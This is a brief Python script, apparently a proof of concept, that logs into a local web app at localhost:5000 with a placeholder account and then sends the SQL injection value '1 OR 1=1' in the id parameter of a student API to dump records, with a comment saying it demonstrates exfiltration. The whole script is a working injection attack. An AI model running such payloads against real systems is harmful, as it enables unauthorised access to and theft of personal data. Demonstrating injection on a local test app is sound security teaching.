import requests

session = requests.Session()
session.post(
    "http://localhost:5000/login",
    data={"username": "alice", "password": "password123"},
)

data = session.get("http://localhost:5000/api/student", params={"id": "1 OR 1=1"})
print(data.text)

#demonstrates exfiltration
